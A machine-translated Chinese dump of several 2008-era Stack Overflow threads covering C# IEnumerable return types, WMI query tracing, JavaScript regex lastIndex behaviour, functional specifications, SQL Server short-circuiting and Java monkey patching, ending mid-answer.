## 回答 #1

> 赞同：30
> 
> 时间：2008-12-19T15:39:27.977

这真的是一个两部分的问题。

1) 返回 IEnumerable<T> 本质上是否有任何问题

什么都没有。事实上，如果您使用 C# 迭代器，这是预期的行为。先发制人地将其转换为 List<T> 或另一个集合类并不是一个好主意。这样做是对调用者的使用模式做出假设。我发现假设关于调用者的任何事情都不是一个好主意。他们可能有充分的理由需要 IEnumerable<T>。也许他们想将其转换为完全不同的集合层次结构（在这种情况下，转换为 List 是浪费的）。

2) 在任何情况下，返回 IEnumerable<T> 以外的东西可能更可取？

是的。虽然对您的来电者做出太多假设并不是一个好主意，但根据您自己的行为做出决定是完全可以的。想象一个场景，你有一个多线程对象，它将请求排队到一个不断更新的对象中。在这种情况下，返回原始 IEnumerable<T> 是不负责任的。一旦集合被修改，可枚举就会失效，并会导致执行。相反，您可以拍摄结构的快照并返回该值。以 List<T> 形式说。在这种情况下，我只会将对象作为直接结构（或接口）返回。

不过，这当然是少见的情况。

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2008-12-19T15:06:29.070

不，回到这里`IEnumerable<T>`是件*好事*，因为您所承诺的只是“一系列（类型化的）值”。LINQ 等的理想选择，并且完全可用。

调用者可以轻松地将这些数据放入列表（或其他任何内容）中 - 尤其是使用 LINQ（`ToList`、`ToArray`等）。

这种方法允许您延迟后台处理值，而不必缓冲所有数据。绝对是个好东西。前几天我也写了[另一个有用的`IEnumerable<T>`技巧](http://marcgravell.blogspot.com/2008/12/brute-force-but-lazily.html)。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-12-19T15:09:50.593

IEnumerable 对我来说很好，但它有一些缺点。客户端必须枚举才能得到结果。它没有办法检查 Count 等。 List 不好，因为你暴露了太多的控制；客户可以从中添加/删除等，这可能是一件坏事。收藏似乎是最好的妥协，至少在 FxCop 看来。我总是使用在我的上下文中看起来合适的东西（例如，如果我想返回一个只读集合，我将集合公开为返回类型并返回 List.AsReadOnly() 或 IEnumerable 以通过 yield 等进行惰性评估）。视情况而定

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-12-19T19:42:10.763

关于您的原则：“接受最少，但返回最大”。

管理大型程序复杂性的关键是一种称为*信息隐藏*的技术。如果您的方法通过构建 a来工作`List<T>`，则通常不需要通过返回该类型来揭示这一事实。如果你这样做了，那么你的调用者可能会修改他们返回的列表。这消除了您使用`yield return`.

所以一个更好的原则是一个函数要遵循的是：“尽可能少地透露你是如何工作的”。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-12-19T16:00:49.197

如果您真的只返回一个枚举，则返回 IEnumerable<T> 是可以的，并且它将被您的调用者这样使用。

但正如其他人指出的那样，它的缺点是调用者可能需要枚举是否需要任何其他信息（例如计数）。如果返回值未实现 ICollection<T>，.NET 3.5 扩展方法 IEnumerable<T>.Count 将在幕后进行枚举，这可能是不可取的。

当结果是集合时，我经常返回 IList<T> 或 ICollection<T> - 在内部，您的方法可以使用 List<T> 并按原样返回它，或者如果要保护，则返回 List<T>.AsReadOnly反对修改（例如，如果您在内部缓存列表）。AFAIK FxCop 对其中任何一个都非常满意。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2011-12-06T15:36:49.670

“接受最少，但回报最多”是我所倡导的。当一个方法返回一个对象时，我们有什么理由不返回实际类型并通过返回基类型来限制对象的功能。然而，这提出了一个问题，当我们设计一个界面时，我们如何知道“最大”（实际类型）是什么。答案很简单。只有在接口设计者正在设计一个开放接口（将在应用程序/组件之外实现）的极端情况下，他们才会知道实际的返回类型可能是什么。聪明的设计师应该始终考虑该方法应该做什么以及最佳/通用返回类型应该是什么。

例如，如果我正在设计一个接口来检索对象向量，并且我知道返回对象的数量是可变的，那么我将始终假设聪明的开发人员将始终使用列表。如果有人计划返回一个数组，我会质疑他的能力，除非他/她只是从他/她不拥有的另一层返回数据。这可能就是 FxCop 提倡 ICollection（List 和 Array 的共同基础）的原因。

综上所述，还有一些其他的事情需要考虑

*   如果返回的数据应该是可变的还是不可变的

*   如果返回的数据在多个调用者之间共享

关于 LINQ 惰性评估，我敢肯定 95% 以上的 C# 用户不了解其中的内容。它是如此的非 oo-ish。OO 促进方法调用的具体状态更改。LINQ 惰性求值促进表达式求值模式的运行时状态更改（非高级用户总是遵循的）。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2010-11-19T12:48:05.097

一个重要方面是，当您返回 a 时，`List<T>`您实际上是在返回一个**reference**。这使得调用者可以操纵您的列表。这是一个常见问题——例如，一个业务层返回`List<T>`一个 GUI 层。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-12-19T15:21:21.133

仅仅因为您说要返回 IEnumerable 并不意味着您不能返回 List。这个想法是减少不必要的耦合。调用者应该关心的只是获取事物的列表，而不是用于包含该列表的集合的确切类型。如果你有一个由数组支持的东西，那么得到像 Count 这样的东西无论如何都会很快。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-12-19T15:45:38.587

我认为您自己的指导很棒——如果您能够更具体地说明您返回的内容而不会影响性能（例如，您不必根据您的结果构建一个列表），那么就这样做。但是，如果您的函数合法地不知道它将找到什么类型，例如在某些情况下您将使用 List 并且在某些情况下使用 Array 等，那么返回 IEnumerable 是您可以做的“最好的” . 将其视为您可能想要返回的所有内容的“最大公倍数”。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2014-01-15T08:05:03.160

我不能接受选择的答案。有一些方法可以处理所描述的场景，但使用 List 或您使用的任何其他方法都不是其中之一。返回 IEnumerable 的那一刻，您必须假设调用者可能会执行 foreach。在这种情况下，具体类型是 List 还是 spaghetti 并不重要。实际上，仅索引是一个问题，尤其是在删除项目时。

任何返回值都是快照。它可能是 IEnumerable 的当前内容，在这种情况下，如果它被缓存，它应该是缓存副本的克隆；如果它应该更动态（如 sql 查询的结果），则使用 yield return；然而，允许容器随意变异并提供诸如 Count 和 indexer 之类的方法是多线程世界中灾难的根源。我什至还没有了解调用者在你的代码应该控制的容器上调用 Add 或 Delete 的能力。

还返回一个具体类型将您锁定在一个实现中。今天在内部你可能正在使用一个列表。明天也许你会变成多线程并且想要使用线程安全的容器或数组或队列或字典的 Values 集合或 Linq 查询的输出。如果您将自己锁定为具体的返回类型，那么您必须更改一堆代码或在返回之前进行转换。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2022-02-08T10:02:04.150

*IEnumerable*很酷，因为您可以使用 yield 迭代器，它只为消费者提供他们需要的数据，但结构中隐藏着成本。

让我用一个例子来解释它。假设我正在使用这种方法：

*IEnumerable GetFilesFromFolder（字符串路径）*

那么，我得到了什么？要获取我文件夹的所有文件，我必须迭代枚举，这很好，毕竟枚举就是这样工作的，但是如果出于任何原因我必须枚举它两次呢？

第二次我应该期待一个刷新的结果还是结果是幂等的？我不知道。我必须检查库/方法的文档。

*消费者对枚举的GetEnumerator*方法的调用，其实可以在后台执行一个I/O操作，或者是一个http调用，或者它可以简单地迭代一个内部数组，我不能确定. 我必须检查文档以希望记录此行为。

这个细节重要吗？我认为确实如此。至少从性能的角度来看。

即使迭代的成本很慢且 CPU 受限，这也不是零，而且在枚举链的情况下可能会变得更糟，这通常会使调试会话变成一场噩梦。

我不想让我的库的使用者怀疑，所以每当我知道我的 API 返回的元素很少时，我总是使用数组作为返回类型，并且只有当要返回的数据很大时，我才使用 IEnumerable 或 IAsyncEnumerable。

无论如何，如果您想返回枚举，请记录您的 API 以告诉消费者结果是否为快照。

# winapi - 调试（跟踪）WMI 查询？

> ID：381211
> 
> 赞同：3
> 
> 时间：2008-12-19T15:04:35.410
> 
> 标签：winapi, wmi, wbem

我有一个第三方程序正在向本地 WMI 提供程序进行 WMI 查询（所以它不使用 DCOM，所以数据包嗅探器不可用）。我想知道这些是什么查询。

它也在 XP 上，因此不幸的是，新的 Vista WMI 跟踪基础结构也已发布。

任何指针？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-29T22:36:54.663

您是否尝试过使用 wmimgmt.msc 将 WMI 日志记录级别设置为 Verbose？（有关[MSDN 记录 WMI 活动](http://msdn.microsoft.com/en-us/library/aa392285.aspx)页面的更多信息）

然后，您应该会看到查询记录到 %windir%\system32\wbem\logs\wbemcore.log 文件。

-戴夫

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-19T15:11:15.363

我相信 WMI 使用 DCOM 进行通信，您可以使用 WireShark 对 DCOM 数据包进行数据包捕获。我相信 WireShark 中用于 DCOM 的解析器是可用的，尽管它仍然可能有助于参考[这篇文章](http://www.microsoft.com/msj/0398/dcom.aspx)（旧的，但应该仍然是相关的）。

这不适用于对 localhost 的 WMI 查询，因此您需要确保它正在查询远程计算机。

如果您确实想要记录本地查询，请查看有关记录 WMI 查询的[MSDN 文章。](http://msdn.microsoft.com/en-us/library/aa826686(VS.85).aspx)

# javascript - Javascript - MultiLine RegExp：lastIndex 卡在换行符上？

> ID：381214
> 
> 赞同：8
> 
> 时间：2008-12-19T15:05:28.013
> 
> 标签：javascript, regex

## 一些背景

来自[Javascript：权威指南](http://books.google.com/books?id=VOS6IlCsuU4C)：

> 然而，何时`regexp`是一个全局正则表达式，`exec()`其行为方式稍微复杂一些。它从的preperty`string`指定的字符位置开始搜索。当它找到匹配时，它设置为匹配后第一个字符的位置。`lastIndex``regexp``lastIndex`

我认为任何经常使用 javascript RegExps 的人都会认出这段话。但是，我在这种方法中发现了一个奇怪的行为。

## 问题

考虑以下代码：

```
>> rx = /^(.*)$/mg

>> tx = 'foo\n\nbar'

>> rx.exec(tx)
[foo,foo]
>> rx.lastIndex
3
>> rx.exec(tx)
[,]
>> rx.lastIndex
4
>> rx.exec(tx)
[,]
>> rx.lastIndex
4
>> rx.exec(tx)
[,]
>> rx.lastIndex
4 
```

RegExp 似乎卡在第二行并且不会增加`lastIndex`属性。这似乎与[The Rhino Book](http://books.google.com/books?id=VOS6IlCsuU4C)相矛盾。如果我自己设置它如下，它会继续并最终按预期返回 null 但似乎我不应该这样做。

```
>> rx.lastIndex = 5
5
>> rx.exec(tx)
[bar,bar]
>> rx.lastIndex
8
>> rx.exec(tx)
null 
```

## 结论

显然，只要`lastIndex`匹配为空字符串，我就可以增加属性。但是，作为好奇的类型，我想知道为什么它没有被该`exec`方法递增。为什么不是？

## 笔记

我在 Chrome 和 Firefox 中观察到了这种行为。似乎只有当有相邻的换行符时才会发生。

### [编辑]

[Tomalak](https://stackoverflow.com/users/18771/tomalak)在下面说，将模式更改为`/^(.+)$/gm`将导致表达式不会卡住，但空白行会被忽略。可以将其更改为仍然匹配该行吗？[感谢托马拉克](https://stackoverflow.com/users/18771/tomalak)的回答！

### [编辑]

使用以下模式并使用第 1 组适用于我能想到的所有字符串。再次感[谢托马拉克](https://stackoverflow.com/users/18771/tomalak)。

```
/^(.*)((\r\n|\r|\n)|$)/gm 
```

### [编辑]

前一个模式返回空行。但是，如果您不关心空白行，[Tomalak](https://stackoverflow.com/users/18771/tomalak)提供了以下解决方案，我认为它更清洁。

```
/^(.*)[\r\n]*/gm 
```

### [编辑]

前两种解决方案都卡在尾随换行符上，因此您必须剥离它们或`lastIndex`手动递增。

### [编辑]

[我在Flagrant Badassery](http://blog.stevenlevithan.com/archives/exec-bugs)`lastIndex`找到了一篇很棒的文章，详细介绍了over的跨浏览器问题。除了很棒的博客名称之外，这篇文章还让我对这个问题有了更深入的了解，并提供了一个很好的跨浏览器解决方案。解决方法如下：

```
var rx = /^/gm,
    tx = 'A\nB\nC',
    m;

while(m = rx.exec(tx)){
    if(!m[0].length && rx.lastIndex > m.index){
        --rx.lastIndex;
    }

    foo();

    if(!m[0].length){
        ++rx.lastIndex;
    }
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-12-19T15:13:32.753

问题是点在

```
^(.*)$ 
```

与换行符不匹配，但通过您的`"m"`切换，您可以制作`"^"`并`"$"`锚定到换行符。`"\n"`这意味着和之间的“无”`"\n"`可以与`"(.*)"`.

由于此匹配的宽度为零，因此`lastIndex`属性无法前进。尝试：

```
^(.+)$ 
```

编辑：要匹配空白行，请执行以下操作：

```
^(.*)\n?     // remove all \r characters beforehand 
```

或者

```
^(.*)(?:\r\n|\n\r|\n|\r)?  // all possible CR/LF combinations, but *once* at most 
```

...然后去比赛组 1。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-25T13:44:33.087

lastIndex 的问题在于，遵循字母标准的 JavaScript 实现将其设置为匹配后下一个字符的偏移量。对于像您这样允许零长度匹配的正则表达式，当找到零长度匹配时， exec() 将因此陷入无限循环。下一次匹配尝试将从相同的位置开始，在该位置找到相同的零长度匹配。

传统上，正则表达式引擎通过在找到零长度匹配时跳过一个字符来处理这个问题。顺便说一句，Internet Explorer 也这样做。

我过去曾在博客中详细介绍过这一点：[注意零长度匹配](http://www.regexguru.com/2008/04/watch-out-for-zero-length-matches/)

# functional-programming - 您对功能规格有何感受？和软件设计？

> ID：381216
> 
> 赞同：10
> 
> 时间：2008-12-19T15:05:58.480
> 
> 标签：functional-programming, project-management, project-planning, specifications

功能规范是帮助还是阻碍您的期望？练习瀑布方法的程序员是否对功能规范持开放态度？我是一名网页设计师/开发人员，与一个由 5 名程序员组成的团队合作，我想编写一个功能规范来解释我们需要什么，这样当我开始工作时——我知道我们正在朝着同一个目标努力。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2008-12-19T15:35:26.690

在我写好设计规范和功能规范并签字之前，我不会开始任何自由职业项目。如果你没有它，流氓客户有太多的空间来镍和一毛钱死。功能规范允许您保持目标/专注，并为您提供一个自然的检查清单。

如果没有功能规范，那么您就会得到所有“假设”开始蔓延，开发人员会思考——你知道，这很有用，而且只需要我一个小时。确定一个小时来编写原型并使其基本工作 - 再加上设计所有测试并确保涵盖所有测试用例的一天，然后再花几天时间来解决所有错误，然后是编写文档的时间。在没有规范的情况下，插入看似微不足道的添加内容的空间太大了。您无疑听说过臭名昭著的“范围蔓延”。当你交付它并试图扭动不付钱给你时，客户也有太多的空间说“这不是我想要的......”。

如果您在开发之前编写好设计规范和功能规范，并且您和客户都已经签署，您不仅对基本细节的理解，而且对所使用语言的所有细微差别的理解都是一样的 -只有这样才能开始真正的工作。

有几个轶事，第一个是相当真实的，而另一个是一个常见的误解：

*   软件开发只占代码的 15%，剩下的就是资源/人员管理。
*   完成项目的前 80% 需要 20% 的时间，而完成后 20% 的时间需要剩余 80% 的时间。

误解是工作原型已经完成了 80% - 不要被愚弄，事实并非如此。所以客户很容易说“什么花了这么长时间，我以为你快完成了！” 然后狡辩说他们为几个月前就应该完成的事情付出了太多。那里的一些设计方法确实很适合这种流行的误解。如果使用不当，瀑布设计方法就是其中之一。

我的观点是确保你的理解是一样的，都签字。设定里程碑，让客户从一开始就非常清楚原型距离项目完成还有很长的路要走，并从一开始就设定这些里程碑是什么以及客户何时可以期望看到它们交付的期望。

对于开发团队的项目经理来说，文档和期望就是一切。没有它你就活不下去，这是你对“我不是这么说”或“我不是这个意思”和“我不付钱给你”的唯一追索方式。

我从比我更合格的开发人员所犯的许多错误中吸取了教训，并看到了它对他们的影响。您的项目最重要的两个文件是设计规范和功能规范。不要在没有它们的情况下离开家，否则它可能 [或很可能会] 回来咬你的屁股。

***附录重新：用户故事：***

关于用户故事的另一个注意事项是，它们非常适合它们的本来面目。它们应该包含在您的功能规范中，但不应该*是*您的功能规范。

一个用户故事只描述一个任务。它非常轻巧，不包含过多的细节。按照常见的建议，它应该适合 3x5 卡...如果您作为项目经理递给我一张 3x5 卡并告诉我根据我阅读的内容编写一个软件，毫无疑问它会交给最后的用户，他们会告诉项目经理这不是他们想要的。

您需要在功能规范中提供更高级别的详细信息。它不应该局限于基本的工作流程。功能规范是一大堆用户故事，以及对这些用户故事的解释、可以对其进行的改进、可以组合以提高效率的常见任务。名单还在继续。

所以用户故事是一个好的开始，但它们不是功能规范的替代品，它们是功能规范*中*的要点。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-12-19T15:21:21.257

我主要使用瀑布模型，并且只使用功能规格。当我自己工作时（我可以设置自己的模型并以任何我想要的方式编程），我首先编写功能规范，然后实施它们。它让我更好地了解工作的规模和范围，帮助我估计所涉及的时间，并帮助确保我不会错过任何事情。

此外，您可以将此文档传递给：

1.  用户，以便他们可以明确他们的要求
2.  开发人员创建功能
3.  测试人员确保他们正在测试正确的东西
4.  架构师，以便他们可以分析需求

在用户故事上使用功能需求是一个偏好和项目范围的问题。如果您的用户群较小，那么您可能能够摆脱用户故事（概述用户可能执行的各种事件序列），但对于较大的项目，您应该使用功能需求，因为它们具有更多细节并导致更少误解。将它们视为与参与项目的所有人员进行交流的一种方式。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-12-19T15:23:56.260

坦率地说，功能规范应该已经成为您的 Big-M（瀑布）方法的一部分。您的功能规范就是您要构建的内容；不一定要如何构建它（这将是您的详细设计/规范和瀑布的下一步）。

如果你还没有写一篇，停下你正在做的事情，写一篇。如果你不这样做，你只是在浪费时间。您可以从[Joel 的文章](http://www.joelonsoftware.com/articles/fog0000000036.html)开始。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-12-19T15:37:03.690

在编写任何代码之前，我花了 10 多年的时间才想到编写功能规范。现在我会为任何需要超过一天的时间写一篇文章。详细程度和假设程度应尽可能多地明确定义需要完成的工作并将其传达给他人（或提醒自己），除此之外的任何事情都是浪费。

其他人更喜欢用户故事......这也很好，只要你做一些计划。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-12-19T15:10:46.520

实现此目的的另一种方法是使用[用户故事](http://en.wikipedia.org/wiki/User_story)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-12-19T15:32:35.243

我发现编写良好的功能规范非常有用。组织良好的功能规范还可以帮助组织您的测试（从单个需求到测试用例的多对多映射）。

`<p style="tongue: in-cheek">`它们也被证明对大型组织中的指责很有用（要求不准确！实施没有遵循要求！QA 没有正确测试这个要求！等等）`</p>`

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-12-19T15:45:36.637

我将第二次[Codeslave对](https://stackoverflow.com/users/685/codeslave)[无痛功能规范](http://www.joelonsoftware.com/articles/fog0000000036.html)的引用。 这是关于规范的一系列很好的文章。另请参阅[此 Stackoverflow 帖子](https://stackoverflow.com/questions/379371/what-makes-a-good-spec#379519)以讨论将哪些内容放入功能规范中。

我已经完成了一些大型项目，其中一个需要数百人年的总努力。随着项目团队的扩大，非正式沟通渠道的数量会以二次上限上升。如果没有规范，这种非正式的沟通机制是沟通事情的唯一方式。有了规范，沟通渠道就接近了中心辐射，使增长更像是项目团队规模的线性函数。

规范确实是让团队“唱出同一张赞美诗”的唯一可扩展方式。应该对规范进行一些审查和协商，但最终必须有人拥有它，以避免项目成为一个免费的项目。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-12-19T16:01:46.840

我认为他们是一个可爱的想法，应该尝试。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-01-19T22:09:38.563

这里只是对一些答案的一些评论......

首先，我确实相信一个好的规范文档对于任何中等复杂的需求（当然对于高度复杂的需求）都很重要。但要确保它是一个好的规范，即不要只陈述显而易见的内容（就像已经提到的一张海报），而且不要遗漏那些对你（甚至开发人员）来说似乎微不足道的部分，因为你可能有更多的知识系统的该部分比其他一些相关的部分（例如测试人员或文档人员）更重要，这将欣赏否则“缺失的位”。

如果你的规范很好，它会被阅读——根据我的经验（我在过去几年里写过很多规范），不好的规范会被抛弃，好的规范会被遵循。

关于用户故事（或有时也称为用例）：我认为这些对于了解场景很重要，但它们通常不能替代细节（例如屏幕模型、功能在何处以及是否可配置、数据模型，迁移问题等），因此您可能需要两者来满足更复杂的要求。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2009-01-19T22:28:43.717

根据我的经验，功能规格在说得不够和说得太多之间有一条很好的界限。

如果他们说得不够多，那么他们就会留下容易被误解的地方。

如果他们说得太多，他们就没有足够的“回旋余地”来改进解决方案。

他们应该**始终**对修订过程持开放态度。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2008-12-19T15:22:22.377

这取决于功能规范。我有功能规范，作者从内到外都了解系统，并这样编写规范，并且我让其他作者编写了他们期望作为用户看到的内容。

使用前者，它更容易，因为我确切地知道我需要写什么以及我需要在哪里写，但它限制了我重构现有代码的难易程度，因为估计只考虑了这个特性，而不是重构现有的代码它触及。

对于后者，我可以自由地重构（只要最终功能相​​同），但如果它是我不熟悉的系统，时间估计就更难了。

总的来说，我喜欢功能规格——我还想提醒人们，它们是写在可弯曲的纸上的，因此应该是灵活的。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2008-12-19T15:45:52.270

我看到提倡的 func 规范或用户故事的一个有趣替代方法是首先为软件编写用户手册。

即使这只是名义上的（即，如果您不打算发布任何手册 - 您可能不应该这样做，因为没有人会阅读它），它可能是一种有用且相当轻量级的方式，可以就软件的功能达成共识做和看起来像。它迫使您预先进行设计。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2008-12-19T15:48:37.020

无论您称它们为功能规范、业务需求还是用户故事，它们都对开发过程非常有益。

当系统完全不符合用户的实际需求时，它们被刻在石头上并被用作推卸责任的工具时，问题就出现了。我更喜欢将功能或需求用作迭代过程的起点，而不是作为系统完成后确切外观的圣经。事情发生了变化，用户通常不了解他们想要什么，直到他们手中有可以使用的东西（可能是工作原型），而不是在一张纸上概念化它在现实世界中的功能. 我最成功的项目

当然，如果您处于固定出价类型的情况下，则此过程将不起作用，正如先前的答案之一所指出的那样。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2009-02-25T04:44:30.330

我发现即使你编写了功能规范，很多细节有时也会在你试图解决的人身上丢失。现在，如果功能规范与某种 UI 模型一起编写，那将产生巨大的差异。UI 模型不仅可以向用户展示您的设想，还可以让用户记住他们一开始就不会想到的事情。

* * *

## 回答 #15

> 赞同：-2
> 
> 时间：2008-12-19T15:45:32.720

我看过并写过很多规格，有些非常好，大多数都不是。他们的主要共同点是他们从未被追随。到编码的第 3 天，他们身上都长满了蜘蛛网。

如果需要，请编写规范，最好的时间是在项目结束时。开发人员遵循它是没有用的，但它至少可以准确地表示所做的事情（我知道——不是真正的规范）。但是不要指望规范会为您编写代码。这才是真正的工作。如果您不知道该写什么，请与您的利益相关者和用户交谈并获得一些好的用户故事，然后继续进行下去。

# sql - SQL Server - 查询短路？

> ID：381224
> 
> 赞同：4
> 
> 时间：2008-12-19T15:09:43.747
> 
> 标签：sql, sql-server

SQL Server 中的 T-SQL 查询是否支持短路？

例如，我有一个情况，我有两个数据库，我正在比较两个表之间的数据以匹配和复制一些信息。在一个表中，“ID”字段总是有前导零（例如“000000001234”），而在另一个表中，ID 字段可能有也可能没有前导零（可能是“000000001234”或“1234”）。

所以我匹配两者的查询类似于： select * from table1 where table1.ID LIKE '%1234'

为了加快速度，我正在考虑在刚才说的类似之前添加一个 OR：table1.ID = table2.ID 来处理两个 ID 都具有填充零并且相等的情况。

这样做是否会通过匹配“=”上的项目而不是评估每一行的 LIKE 来加快查询速度（是否会短路并跳过 LIKE）？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-12-19T15:35:43.163

您可以将计算列添加到表中。然后，索引计算列并在连接中使用该列。

前任：

```
Alter Table Table1 Add PaddedId As Right('000000000000' + Id, 12)
Create Index idx_WhateverIndexNameYouWant On Table1(PaddedId) 
```

那么您的查询将是...

```
select * from table1 where table1.PaddedID ='000000001234' 
```

这将使用您刚刚创建的索引来快速返回该行。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-12-19T15:57:08.407

SQL Server 不会**短路**where 条件。它不能，因为它是一个基于成本的系统：[SQL Server 如何短路 WHERE 条件评估](http://weblogs.sqlteam.com/mladenp/archive/2008/02/25/How-SQL-Server-short-circuits-WHERE-condition-evaluation.aspx)。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-12-19T15:35:11.633

您要确保至少有一个表将其实际数据类型用于 ID，并且如果可能，它可以使用索引查找。这取决于您的查询的选择性和匹配率，但要确定应该将哪个转换为另一个。如果您知道必须扫描整个第一个表，那么无论如何您都不能使用搜索，您应该将该 ID 转换为另一个表的数据类型。

为确保您可以使用索引，也要避免 LIKE。例如，最好有：

```
WHERE
     T1.ID = CAST(T2.ID AS VARCHAR) OR
     T1.ID = RIGHT('0000000000' + CAST(T2.ID AS VARCHAR), 10) 
```

比：

```
WHERE
     T1.ID LIKE '%' + CAST(T2.ID AS VARCHAR) 
```

正如 Steven A. Lowe 所提到的，第二个查询也可能不准确。

如果您要使用 T1 中的所有行（换句话说，T2 的 LEFT OUTER JOIN），那么您可能会更好：

```
WHERE
     CAST(T1.ID AS INT) = T2.ID 
```

如果您不确定，请使用每种方法执行一些查询计划，看看哪种方法最有效。

绝对最好的方法是按照其他人的建议，如果可能的话，更改表的数据类型以匹配。即使你不能在这个项目到期之前完成它，也要把它放在你近期的“待办事项”清单上。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-12-19T15:38:39.053

怎么样，

```
table1WithZero.ID = REPLICATE('0', 12-len(table2.ID))+table2.ID 
```

在这种情况下，它应该能够使用 table1 上的索引

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2010-04-27T12:11:35.787

以防万一它有用，正如 Mladen Prajdic 的 anwer 中的链接页面所解释的那样，CASE 子句*是*短路评估的。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-12-19T15:14:24.720

修复数据库以保持一致

```
select * from table1 where table1.ID LIKE '%1234' 
```

将匹配“1234”、“01234”、“00000000001234”，还可以匹配“999991234”。使用 LIKE 几乎可以保证索引扫描（假设 table1.ID 已编入索引！）。清理数据将显着提高性能。

如果无法清理数据，请编写用户定义函数 (UDF) 以去除前导零，例如

```
select * from table1 where dbo.udfStripLeadingZeros(table1.ID) = '1234' 
```

这可能不会提高性能（因为必须为每一行运行该函数）但它会消除错误匹配并使查询的意图更加明显

编辑：如果可能的话，Tom H 建议将其转换为整数是最好的。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-12-19T15:27:53.880

如果 ID 是纯数字（如您的示例），我会建议（如果可能）将该字段更改为数字类型。如果数据库已经在使用中，那么可能很难更改类型。

# java - 是否可以在 Java 中进行猴子补丁？

> ID：381226
> 
> 赞同：22
> 
> 时间：2008-12-19T15:10:23.853
> 
> 标签：java, reflection, monkeypatching

如果可能的话，我不想讨论这种方法的优点。我相信答案是“不”。但也许有人会让我大吃一惊！

想象一下，您有一个核心小部件类。它有一个方法`calculateHeight()`，它返回一个高度。高度太大 - 这导致按钮（比如说）太大。您可以扩展 DefaultWidget 以创建您自己的 NiceWidget，并实现您自己的`calculateHeight()`以返回更好的尺寸。

现在是一个库类 WindowDisplayFactory，以相当复杂的方法实例化 DefaultWidget。您希望它使用您的 NiceWidget。工厂类的方法如下所示：

```
public IWidget createView(Component parent) {
    DefaultWidget widget = new DefaultWidget(CONSTS.BLUE, CONSTS.SIZE_STUPIDLY);

    // bunch of ifs ...
    SomeOtherWidget bla = new SomeOtherWidget(widget);
    SomeResultWidget result = new SomeResultWidget(parent);
    SomeListener listener = new SomeListener(parent, widget, flags);

    // more widget creation and voodoo here

    return result;
} 
```

就是这样。结果使 DefaultWidget 深入到其他对象的层次结构中。问题 - 如何让这个工厂方法使用我自己的 NiceWidget？或者至少让我自己`calculateHeight()`的。理想情况下，我希望能够修补 DefaultWidget 以便它的 calculateHeight 做正确的事情......

```
public class MyWindowDisplayFactory {
    public IWidget createView(Component parent) {
        DefaultWidget.class.setMethod("calculateHeight", myCalculateHeight);
        return super.createView(parent);
    }
} 
```

这就是我可以在 Python、Ruby 等中做的事情。`setMethod()`不过，我已经发明了这个名字。对我开放的其他选择是：

*   将方法的代码复制粘贴`createView()`到我自己的继承自工厂类的类中
*   与太大的小部件一起生活

工厂类无法更改 - 它是核心平台 API 的一部分。我尝试对返回的结果进行反射以获取（最终）添加的小部件，但它向下有几个小部件层，并且在某个地方它被用来初始化其他东西，导致奇怪的副作用。

有任何想法吗？到目前为止，我的解决方案是复制粘贴工作，但这是一个需要在升级到更新版本的平台时跟踪父工厂类中的更改的警察，我很想听听其他选项。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-12-19T15:26:09.267

也许您可以使用面向方面的编程来捕获对该函数的调用并返回您自己的版本？

Spring 提供了一些 AOP 功能，但也有其他库也可以做到这一点。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-12-19T15:14:46.030

一种丑陋的解决方案是将您自己的 DefaultWidget 实现（具有相同的 FQCN）放在 Classpath 上，而不是正常实现。这是一个可怕的黑客攻击，但我能想到的所有其他方法都更糟糕。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-12-19T15:28:12.647

只是我的概念想法，

可以使用 AOP，通过字节码工程的方式，向 calculateHeight 方法注入一个切面。

然后，您可以通过 ThreadLocal 或其他变量启用您的补丁。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-19T17:00:04.710

[cglib](http://cglib.sourceforge.net/)是一个 Java 库，可以做一些类似于猴子补丁的事情——它可以在运行时操纵字节码来改变某些行为。我不确定它是否可以完全满足您的需求，但值得一看...

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2017-05-01T18:56:31.720

使用 Unsafe.putObject 和类查找器在 Java 中进行猴子补丁是完全可能的。在这里写了一篇博文：

[https://tersesystems.com/blog/2014/03/02/monkeypatching-java-classes/](https://tersesystems.com/blog/2014/03/02/monkeypatching-java-classes/)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-19T15:21:18.510

这样做的面向对象的方法是创建一个实现 IWidget 的包装器，将所有调用委托给实际的小部件，但 calculateHeight 除外，类似于：

```
class MyWidget implements IWidget {
    private IWidget delegate;
    public MyWidget(IWidget d) {
        this.delegate = d;
    }
    public int calculateHeight() {
